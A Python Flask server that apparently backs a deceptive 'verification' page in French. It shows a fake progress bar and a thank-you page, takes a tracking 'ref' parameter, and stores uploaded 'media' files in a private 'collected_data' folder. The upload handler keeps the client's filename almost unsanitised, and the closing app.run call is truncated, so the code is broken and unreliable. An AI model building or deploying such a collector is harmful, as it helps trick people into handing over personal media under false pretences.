#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from flask import Flask, request, jsonify, render_template, send_from_directory, redirect
import os
import hashlib
from datetime import datetime

app = Flask(__name__)
app.config['UPLOAD_FOLDER'] = 'collected_data'
app.config['MAX_CONTENT_LENGTH'] = 50 * 1024 * 1024

if not os.path.exists(app.config['UPLOAD_FOLDER']):
    os.makedirs(app.config['UPLOAD_FOLDER'], mode=0o700)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/init')
def init():
    ref = request.args.get('ref', '')
    return redirect('/progress')

@app.route('/progress')
def progress():
    return """
    <html><body>
        <h2>Vérification en cours...</h2>
        <progress value="50" max="100"></progress>
        <script>setTimeout(() => window.location.href = '/complete', 5000);</script>
    </body></html>
    """

@app.route('/complete')
def complete():
    return """
    <html><body>
        <h2 style="color:green;">Vérification terminée!</h2>
        <p>Merci pour votre participation.</p>
    </body></html>
    """

@app.route('/favicon.ico')
def favicon():
    return send_from_directory('static', 'favicon.ico'), 200

@app.route('/upload', methods=['POST'])
def upload():
    try:
        if 'media' not in request.files:
            return jsonify({
                'status': 'error',
                'message': 'Aucun fichier reçu',
                'timestamp': datetime.now().isoformat()
            }), 400

        file = request.files['media']
        if file.filename == '':
            return jsonify({
                'status': 'error',
                'message': 'Nom de fichier vide',
                'timestamp': datetime.now().isoformat()
            }), 400

        file_hash = hashlib.sha256(file.read()).hexdigest()
        file.seek(0)
        filename = f"{file_hash[:16]}_{file.filename.replace(' ', '_')}"
        save_path = os.path.join(app.config['UPLOAD_FOLDER'], filename)

        file.save(save_path)
        os.chmod(save_path, 0o600)

        return jsonify({
            'status': 'success',
            'filename': filename,
            'size': os.path.getsize(save_path),
            'timestamp': datetime.now().isoformat()
        }), 200
    except Exception as e:
        return jsonify({
            'status': 'error',
            'message': str(e),
            'timestamp': datetime.now().isoformat()
        }), 500

if __name__ == '__main__':
    app.run(
        host='0.0.0.0',
        port=8080,
        threaded=True,
        debug=False
    
